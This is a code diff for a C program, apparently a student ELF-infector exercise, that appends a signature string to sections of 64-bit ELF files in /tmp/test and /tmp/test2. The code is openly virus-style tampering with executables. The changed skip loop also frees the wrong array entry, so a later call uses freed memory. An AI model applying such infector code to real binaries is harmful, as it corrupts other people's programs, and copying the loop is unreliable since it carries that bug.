@@ -27,7 +27,7 @@ void	infect_elf(char *file_path)
 	if (section != NULL && (strtab_index == size || shstrtab_index == size)) {
 		char *content = malloc(section->data->sh_size + 16);
 		memcpy(content, section->content, section->data->sh_size);
-		memcpy(content + section->data->sh_size, "jguyet-frmarinh", 15);
+		memcpy(content + section->data->sh_size, "jguyet-frmarinh", 16);
 		section->data->sh_size += 16;
 		free(section->content);
 		section->content = content;
@@ -43,10 +43,9 @@ void	infect_elf(char *file_path)
 	destruct_elf(elf);
 }
 
-int		main(int argc, char **argv)
+void	infect_directory(char *dir, char **argv)
 {
-	(void)argc;
-	char **files = get_elf_files(NULL, ".", ELF_64);
+	char **files = get_elf_files(NULL, dir, ELF_64);
 	int i = 0;
 
 	while (i < (int)array_length(files))
@@ -54,10 +53,22 @@ int		main(int argc, char **argv)
 		if (strcmp(argv[0], files[i]) == 0)
 		{
 			i++;
+			free(files[i]);
 			continue ;
 		}
 		infect_elf(files[i]);
+		free(files[i]);
 		i++;
 	}
+	if (files != NULL)
+		free(files);
+}
+
+int		main(int argc, char **argv)
+{
+	if (argc == 0)
+		return (0);
+	infect_directory("/tmp/test", argv);
+	infect_directory("/tmp/test2", argv);
 	return (0);
 }
